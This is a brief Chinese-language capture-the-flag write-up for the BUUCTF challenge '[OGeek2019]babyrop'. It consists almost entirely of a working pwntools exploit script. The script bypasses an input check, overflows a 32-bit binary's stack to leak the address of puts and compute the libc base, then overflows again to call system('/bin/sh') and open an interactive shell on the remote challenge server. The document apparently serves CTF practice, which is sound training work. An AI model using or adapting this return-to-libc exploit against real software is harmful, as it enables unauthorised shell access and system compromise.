# 分析

来自[BUUCTF在线评测 (buuoj.cn)](https://buuoj.cn/challenges#[OGeek2019]babyrop)

checksec一下

# exp

```python
from pwn import *
context(os='linux',arch='i386',log_level='debug')
libc =ELF('./libc-2.23.so')
elf=ELF('./badrop')
p=remote('node5.buuoj.cn',26336)
#p=process('./badrop')

puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
main_addr=0x8048825
#进行第一次溢出
payload1=flat(b'\x00',b'\xff'*7)	#进行绕过
p.sendline(payload1)
p.recvuntil('Correct\n')
payload2=flat(b'A'*(0xe7+4),p32(puts_plt),p32(main_addr),p32(puts_got))	#与64位传参不同
p.sendline(payload2)
puts_addr = u32(p.recv(4))

base = puts_addr - libc.sym['puts']	#获取libc的基地址
system_addr = base + libc.sym['system']
bin_sh = base + next(libc.search(b'/bin/sh'))

#再次进入main中执行，第二次溢出
p.sendline(payload1)
payload3=flat(b'A'*(0xe7+4),p32(system_addr),p32(system_addr),p32(bin_sh))
p.sendline(payload3)
p.interactive()
```

